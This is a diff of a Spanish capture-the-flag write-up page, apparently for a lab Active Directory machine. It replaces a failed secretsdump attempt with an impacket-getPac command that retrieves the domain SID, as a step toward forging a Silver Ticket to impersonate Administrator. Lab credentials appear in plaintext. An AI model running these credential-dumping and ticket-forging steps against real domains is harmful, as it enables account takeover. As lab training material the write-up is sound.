@@ -321,29 +321,10 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Mediante un <code class="language-plaintext highlighter-rouge">Silver Ticket</code> con ese <code class="language-plaintext highlighter-rouge">SPN</code> podriamos suplantar al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> pero antes de ello necesitamos varias cosas, iniciaremos con el <code class="language-plaintext highlighter-rouge">SID</code> del dominio que podemos obtener con <code class="language-plaintext highlighter-rouge">secretsdump</code> con el parametro <code class="language-plaintext highlighter-rouge">-debug</code> con las credenciales de <code class="language-plaintext highlighter-rouge">ksimpson</code> que aunque no funciona nos lo muestra</p>
+<p class="plain-text">Mediante un <code class="language-plaintext highlighter-rouge">Silver Ticket</code> con ese <code class="language-plaintext highlighter-rouge">SPN</code> podriamos suplantar al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> pero antes de ello necesitamos varias cosas, iniciaremos con el <code class="language-plaintext highlighter-rouge">SID</code> del dominio que podemos obtener con <code class="language-plaintext highlighter-rouge">getPac</code> que entre la informacion lo muestra</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-secretsdump </span><span class="p">scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -debug 2>/dev/null
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-
-[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
-[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
-[+] Trying to connect to KDC at SCRM.LOCAL
-[+] Trying to connect to KDC at SCRM.LOCAL
-[+] Trying to connect to KDC at SCRM.LOCAL
-[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-[+] Session resume file will be sessionresume_GlMkRGSQ
-[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
-[+] Trying to connect to KDC at SCRM.LOCAL
-[+] Trying to connect to KDC at SCRM.LOCAL
-[+] Trying to connect to KDC at SCRM.LOCAL
-[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 
-[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a} 
-[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.  
-[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
-[*] Cleaning up...</span>
+<code><span class="ve">❯ impacket-getPac </span><span class="p">scrm.local/ksimpson:ksimpson -targetUser ksimpson | grep SID  
+Domain </span><span class="ro">SID</span><span class="p">: S-1-5-21-2743207045-1827831105-2542523200</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Lo siguiente es el <code class="language-plaintext highlighter-rouge">hash NT</code>, ya que tenemos la <code class="language-plaintext highlighter-rouge">contraseña</code> podemos convertirlo</p>
